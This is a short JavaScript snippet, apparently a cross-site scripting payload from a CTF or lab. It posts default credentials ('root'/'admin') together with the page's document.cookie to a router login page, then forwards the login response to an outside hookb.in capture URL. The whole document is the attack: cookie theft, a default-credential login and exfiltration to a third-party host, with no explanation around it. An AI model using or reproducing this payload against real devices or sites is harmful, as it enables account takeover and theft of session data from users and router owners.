const http = new XMLHttpRequest();
http.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
http.open('POST', 'http://router.local/login.php', true);

http.onload = function () {
    if (http.readyState === http.DONE) {
            const xhr = new XMLHttpRequest();
            xhr.open('POST', 'https://hookb.in/dm0RE8d9oBux8YjjNMw6', true);
            xhr.setRequestHeader('Content-type', 'application/json');
            xhr.send(JSON.stringify(http.responseText));
        
    }
};
//http.open('GET', 'http://router.local');
//"username=root&pin=admin¬Robot=on"
const cook = document.cookie;
http.send(cook+"username=root&pin=admin");
